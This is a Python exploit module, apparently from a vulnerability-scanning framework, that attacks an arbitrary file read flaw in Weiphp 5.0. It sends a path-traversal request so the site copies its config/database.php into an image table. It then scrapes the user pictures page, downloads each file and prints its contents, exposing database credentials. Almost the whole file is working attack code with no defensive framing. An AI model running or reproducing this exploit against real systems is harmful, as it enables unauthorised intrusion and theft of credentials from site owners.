#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import random
import re
from rich.console import Console
from rich.table import Table


class Module:
    def __init__(self, logger):
        self.logger = logger
        self.options = {
            "url": {"value": None, "required": True},
        }

    def info(self):
        console = Console()
        table = Table()
        table.add_column("Author")
        table.add_column("Description")
        table.add_column("Other")
        table.add_row("PeiQi","Weiphp5.0 front-end file read arbitrary","-")
        console.print(table)


    def run(self):
        for key in self.options:
            if (
                self.options[key]["value"] is None
                and self.options[key]["required"] is True
            ):
                self.logger.error("Required key {} is not set".format(key))
                return

        if not self.options["url"]["value"].startswith("http"):
            url = "http://" + self.options["url"]["value"]
            print("[TARGET]",url)
            upload_url = url + "/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
                }
            data = {
                "1":1
            }
            
            try:
                response = requests.post(url=upload_url, headers=headers, data=data, timeout=20)
                if response.status_code == 200:
                    print("\033[32m[+] Successfully write database.php file into Pictrue table.\033[0m")
                else:
                    print("\033[31m[x] Vulnerability does not exist.\033[0m")
            except:
                print("\033[31m[x] Vulnerability does not exist.\033[0m")
                
            vnln_url = url + "/public/index.php/home/file/user_pics"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
                }   
            try:
                response = requests.get(url=vnln_url, headers=headers).text
                href = re.findall(r'<img src="(.*?)"', response)
                for i in href:
                    print("\033[32m[+] Get sensitive file URLï¼š{}\033[0m".format(i))
                    data = requests.get(url=i, headers=headers)
                    path = str(random.randint(1,999)) + '.php'
                    with open(path, 'wb') as f:
                        f.write(data.content)
                        print("\033[32m[+] The successfully downloaded file is:{}\033[0m".format(path))
                        print("\033[32m[+] The content of the file is:\n\033[0m{}".format(data.text))
            
            except:
                print("\033[31m[x] Failed to get file name. \033[0m")

